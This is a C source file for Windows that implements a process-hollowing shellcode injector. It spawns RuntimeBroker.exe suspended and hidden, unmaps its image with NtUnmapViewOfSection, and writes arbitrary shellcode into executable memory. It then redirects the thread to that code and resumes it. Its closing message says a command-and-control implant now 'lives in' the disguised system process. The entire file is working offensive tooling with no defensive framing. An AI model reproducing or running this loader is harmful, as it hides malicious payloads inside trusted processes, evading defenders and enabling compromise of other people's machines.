#include <windows.h>
#include <stdio.h>

typedef LONG (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <shellcode.bin> [target_exe]\n", argv[0]);
        return 1;
    }

    const char *sc_path = argv[1];
    const char *target  = argc > 2 ? argv[2]
                          : "C:\\Windows\\System32\\RuntimeBroker.exe";

    /* ---- 0. Read shellcode ---- */
    HANDLE hFile = CreateFileA(sc_path, GENERIC_READ, 0, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open %s (%lu)\n", sc_path, GetLastError());
        return 1;
    }
    DWORD sc_len = GetFileSize(hFile, NULL);
    LPVOID sc_buf = VirtualAlloc(NULL, sc_len, MEM_COMMIT, PAGE_READWRITE);
    DWORD nread;
    ReadFile(hFile, sc_buf, sc_len, &nread, NULL);
    CloseHandle(hFile);
    printf("[+] Shellcode: %lu bytes from %s\n", sc_len, sc_path);

    /* ---- 1. Create suspended process ---- */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
        return 1;
    }
    printf("[+] Spawned %s  PID=%lu  TID=%lu (SUSPENDED)\n",
           target, pi.dwProcessId, pi.dwThreadId);

    /* ---- 2. Get the image base from the PEB ---- */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

#ifdef _WIN64
    ULONGLONG peb_addr = ctx.Rdx;
    ULONGLONG image_base = 0;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(peb_addr + 0x10),
                      &image_base, sizeof(image_base), NULL);
#else
    DWORD peb_addr = ctx.Ebx;
    DWORD image_base = 0;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(peb_addr + 0x8),
                      &image_base, sizeof(image_base), NULL);
#endif
    printf("[+] Target image base: 0x%llx\n", (unsigned long long)image_base);

    /* ---- 3. Unmap the original image (hollow it out) ---- */
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

    if (!NtUnmapViewOfSection) {
        printf("[-] Cannot resolve NtUnmapViewOfSection\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    LONG status = NtUnmapViewOfSection(pi.hProcess, (PVOID)image_base);
    printf("[+] NtUnmapViewOfSection status: 0x%lx\n", status);

    /* ---- 4. Allocate memory at the original image base ---- */
    LPVOID remote = VirtualAllocEx(pi.hProcess, (LPVOID)image_base, sc_len,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!remote) {
        printf("[!] VirtualAllocEx at image base failed, trying any address\n");
        remote = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    }
    if (!remote) {
        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Allocated %lu bytes at %p in PID %lu\n",
           sc_len, remote, pi.dwProcessId);

    /* ---- 5. Write shellcode ---- */
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, remote, sc_buf, sc_len, &written);
    printf("[+] Wrote %llu bytes\n", (unsigned long long)written);

    /* ---- 6. Redirect RIP to shellcode ---- */
#ifdef _WIN64
    ctx.Rip = (DWORD64)remote;
#else
    ctx.Eax = (DWORD)remote;
#endif
    SetThreadContext(pi.hThread, &ctx);
    printf("[+] RIP redirected to %p\n", remote);

    /* ---- 7. Resume ---- */
    ResumeThread(pi.hThread);
    printf("[+] Thread resumed. Shellcode executing in PID %lu\n",
           pi.dwProcessId);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    VirtualFree(sc_buf, 0, MEM_RELEASE);

    printf("[*] Injector exiting. C2 lives in %s (PID %lu)\n",
           target, pi.dwProcessId);
    return 0;
}
